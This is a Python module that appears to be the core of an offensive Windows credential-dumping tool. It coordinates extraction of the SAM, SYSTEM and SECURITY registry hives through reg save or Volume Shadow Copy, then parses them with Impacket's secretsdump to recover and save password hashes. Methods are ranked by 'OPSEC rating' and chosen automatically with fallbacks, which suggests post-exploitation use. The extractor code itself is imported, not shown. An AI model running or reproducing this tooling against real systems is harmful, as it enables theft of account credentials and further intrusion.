#!/usr/bin/env python3
"""
Core SAM/SYSTEM Extraction Framework
Orchestrates extraction and parsing operations
"""

from pathlib import Path
from typing import Optional, Dict, List

from .methods import (
    RegSaveExtractor,
    VSSExtractor,
    EXTRACTOR_REGISTRY,
    list_methods,
    get_method_info
)
from .parsers import SecretsdumpParser
from .utils import check_admin_privileges, print_privilege_status, validate_extracted_files


class SAMExtractor:
    """
    Main SAM/SYSTEM extraction framework
    Coordinates extraction methods and hash parsing
    """
    
    def __init__(self, output_dir: str = "sam_dumps"):
        """
        Initialize SAM extractor framework
        
        Args:
            output_dir: Directory for extracted files
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Initialize parser
        self.parser = SecretsdumpParser()
        
        # Initialize extractors
        self.extractors = {
            'reg_save': RegSaveExtractor(self.output_dir),
            'vss': VSSExtractor(self.output_dir)
        }
        
        print(f"[+] SAM Extractor Framework initialized")
        print(f"[+] Output directory: {self.output_dir}")
        print(f"[+] Available methods: {', '.join(self.extractors.keys())}")
    
    def check_privileges(self) -> bool:
        """
        Check if we have required privileges
        
        Returns:
            bool: True if admin privileges available
        """
        is_admin, msg = check_admin_privileges()
        
        if is_admin:
            print(f"[+] {msg}")
            return True
        else:
            print(f"[-] ERROR: {msg}")
            print(f"[!] Run as: Administrator or SYSTEM")
            return False
    
    def list_available_methods(self) -> List[str]:
        """
        List methods that are actually available
        
        Returns:
            List of available method names
        """
        available = []
        
        print(f"\n[*] Checking method availability...")
        
        for name, extractor in self.extractors.items():
            is_avail = extractor.is_available()
            status = "✓" if is_avail else "✗"
            
            print(f"    {status} {name}: {'Available' if is_avail else 'Not available'}")
            
            if is_avail:
                available.append(name)
        
        return available
    
    def extract(self, method: str) -> Optional[Dict]:
        """
        Execute extraction using specified method
        
        Args:
            method: Extraction method name
            
        Returns:
            Dict with extracted file paths or None on failure
        """
        if method not in self.extractors:
            print(f"[-] Unknown method: {method}")
            print(f"[!] Available methods: {', '.join(self.extractors.keys())}")
            return None
        
        extractor = self.extractors[method]
        
        if not extractor.is_available():
            print(f"[-] Method '{method}' is not available")
            return None
        
        return extractor.extract()
    
    def auto_extract(self, preferred_method: str = 'reg_save') -> Optional[Dict]:
        """
        Automatically extract using best available method
        Falls back to alternatives if preferred method fails
        
        Args:
            preferred_method: Preferred method to try first
            
        Returns:
            Dict with extracted file paths or None if all methods fail
        """
        print(f"\n" + "="*70)
        print(f"AUTO SAM/SYSTEM EXTRACTION")
        print(f"Preferred method: {preferred_method}")
        print(f"="*70)
        
        # Check privileges first
        if not self.check_privileges():
            return None
        
        # Try preferred method first
        if preferred_method in self.extractors:
            print(f"\n[*] Attempting preferred method: {preferred_method}")
            extractor = self.extractors[preferred_method]
            
            if extractor.is_available():
                result = extractor.extract()
                if result:
                    return result
            else:
                print(f"[!] Preferred method not available, trying alternatives...")
        
        # Fallback order (by OPSEC rating)
        fallback_order = ['vss', 'reg_save']
        
        for method in fallback_order:
            if method == preferred_method:
                continue  # Already tried
            
            if method in self.extractors:
                extractor = self.extractors[method]
                
                if extractor.is_available():
                    print(f"\n[*] Falling back to: {method}")
                    result = extractor.extract()
                    
                    if result:
                        return result
        
        print(f"\n[-] All extraction methods failed")
        return None
    
    def parse_hives(self, sam_file: str, system_file: str, 
                   security_file: Optional[str] = None,
                   save_hashes: bool = True) -> Optional[List[Dict]]:
        """
        Parse extracted hive files and extract hashes
        
        Args:
            sam_file: Path to SAM file
            system_file: Path to SYSTEM file
            security_file: Optional SECURITY file
            save_hashes: Whether to save hashes to files
            
        Returns:
            List of credentials or None on failure
        """
        if not self.parser.is_available():
            print(f"[-] Parser not available")
            print(f"[!] Install Impacket: pip install impacket")
            return None
        
        # Validate files
        is_valid, msg = validate_extracted_files(sam_file, system_file)
        
        if not is_valid:
            print(f"[-] File validation failed: {msg}")
            return None
        
        output_name = "sam_hashes" if save_hashes else None
        return self.parser.parse_and_display(sam_file, system_file, security_file, save_to=output_name)
    
    def extract_and_parse(self, method: str = 'auto', auto_parse: bool = True) -> Optional[Dict]:
        """
        Extract SAM/SYSTEM and automatically parse hashes
        
        Args:
            method: Extraction method or 'auto' for automatic selection
            auto_parse: Whether to automatically parse hives
            
        Returns:
            Dict with extraction results and credentials
        """
        # Perform extraction
        if method == 'auto':
            result = self.auto_extract()
        else:
            result = self.extract(method)
        
        if not result:
            return None
        
        # Parse hives if requested
        if auto_parse:
            print(f"\n[*] Automatically parsing hives...")
            
            sam_file = result.get('sam')
            system_file = result.get('system')
            security_file = result.get('security')
            
            if sam_file and system_file:
                credentials = self.parse_hives(
                    sam_file,
                    system_file,
                    security_file,
                    save_hashes=True
                )
                
                if credentials:
                    result['credentials'] = credentials
                    result['credential_count'] = len(credentials)
        
        return result
    
    def show_method_info(self, method: str):
        """
        Display detailed information about an extraction method
        
        Args:
            method: Method name
        """
        info = get_method_info(method)
        
        if not info:
            print(f"[-] Unknown method: {method}")
            return
        
        print(f"\n" + "="*70)
        print(f"METHOD: {info['name'].upper()}")
        print(f"="*70)
        
        print(f"\nDescription: {info['description']}")
        print(f"OPSEC Rating: {info['opsec_rating']}")
        
        print(f"\nRequirements:")
        for req in info['requirements']:
            print(f"  • {req}")
        
        print(f"\nAdvantages:")
        for adv in info['advantages']:
            print(f"  + {adv}")
        
        print(f"\nDisadvantages:")
        for dis in info['disadvantages']:
            print(f"  - {dis}")
        
        if 'targets' in info:
            print(f"\nTargets:")
            for target in info['targets']:
                print(f"  • {target}")
    
    def show_all_methods(self):
        """Display information about all available methods"""
        methods = list(self.extractors.keys())
        
        print(f"\n" + "="*70)
        print(f"AVAILABLE EXTRACTION METHODS")
        print(f"="*70)
        
        for method in methods:
            info = get_method_info(method)
            if info:
                avail = "✓" if self.extractors[method].is_available() else "✗"
                print(f"\n{avail} {method.upper()} (OPSEC: {info['opsec_rating']})")
                print(f"  {info['description']}")
